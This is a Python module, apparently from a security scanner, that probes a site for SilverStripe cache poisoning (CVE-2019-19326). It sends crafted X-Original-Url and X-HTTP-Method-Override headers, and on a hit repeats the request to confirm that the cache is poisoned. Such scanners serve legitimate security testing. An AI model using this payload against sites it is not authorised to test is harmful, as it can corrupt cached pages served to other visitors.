#!/usr/bin/env python3

"""
https://www.silverstripe.org/download/security-releases/cve-2019-19326/
https://docs.silverstripe.org/en/3/changelogs/3.7.5/
"""


from utils.style import Colors, Identify
from utils.utils import (
    BIG_CONTENT_DELTA_RANGE,
    CONTENT_DELTA_RANGE,
    configure_logger,
    requests,
    sys,
)

logger = configure_logger(__name__)


def confirm_vuln(
    url: str,
    s: requests.Session,
    headers: dict,
    authent: tuple[str, str] | None,
) -> None:
    for _ in range(5):
        s.get(
            url,
            verify=False,
            auth=authent,
            headers=headers,
            timeout=10,
            allow_redirects=False,
        )
    s.get(url, verify=False, auth=authent, timeout=10, allow_redirects=False)


def silverstripe(
    url: str,
    s: requests.Session,
    req_main: requests.Response,
    custom_header: dict,
    authent: tuple[str, str] | None,
) -> None:

    main_len = len(req_main.content)
    headers = {"X-Original-Url": "plopiplop", "X-HTTP-Method-Override": "POST"}
    try:
        req = s.get(
            url,
            verify=False,
            auth=authent,
            headers=headers,
            timeout=10,
            allow_redirects=False,
        )
        len_req = len(req.content)

        range_exlusion = (
            range(main_len - CONTENT_DELTA_RANGE, main_len + CONTENT_DELTA_RANGE)
            if main_len < 10000
            else range(
                main_len - BIG_CONTENT_DELTA_RANGE, main_len + BIG_CONTENT_DELTA_RANGE
            )
        )

        if "plopiplop" in req.text or "plopiplop" in req.headers:
            print(
                f" {Identify.behavior} | CVE-2019-19326 | TAG OK | {Colors.BLUE}{url}{Colors.RESET} | PAYLOAD: {headers}"
            )
            confirm_vuln(url, s, headers, authent)
        elif len_req not in range_exlusion and req.status_code not in [
            403,
            429,
            301,
            302,
        ]:
            print(
                f" {Identify.behavior} | CVE-2019-19326 | {Colors.BLUE}{url}{Colors.RESET} | DIFFERENT RESPONSE LENGTH {main_len}b > {len_req}b | PAYLOAD: {headers}"
            )
            confirm_vuln(url, s, headers, authent)
        elif req.status_code != req_main.status_code and req.status_code not in [
            403,
            429,
        ]:
            print(
                f" {Identify.behavior} | CVE-2019-19326 | {Colors.BLUE}{url}{Colors.RESET} | DIFFERENT STATUS-CODE | {req_main.status_code} > {req.status_code} | PAYLOAD: {headers}"
            )
            confirm_vuln(url, s, headers, authent)
    except requests.Timeout as t:
        logger.error(f"request timeout {url}", t)
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except Exception as e:
        logger.exception(e)
